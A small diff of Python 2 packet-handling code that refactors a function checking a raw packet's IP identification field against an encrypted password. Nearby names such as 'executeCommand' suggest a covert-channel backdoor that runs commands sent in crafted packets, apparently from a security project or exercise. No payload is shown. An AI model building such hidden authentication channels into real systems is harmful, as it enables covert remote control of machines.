@@ -66,14 +66,16 @@ def checkType(packet):
 		return 'udp'
 
 def authenticated(packet):	
+	print "checking packet"
 	ethLength = 14
 	ipLength = 20
 	ip = packet[ethLength:ipLength+ethLength]
 	ipHeader = unpack('!BBHHHBBH4s4s' , ip)
 	ipIdent = ipHeader[3]
+	pswd = utils.encrypt(config.password)
 
 	# check ip identification field for encrypted password
- 	if ipIdent == utils.encrypt(config.password):
+ 	if ipIdent == pswd:
  		print "auth!"
 
 def executeCommand(ip, proto, data):
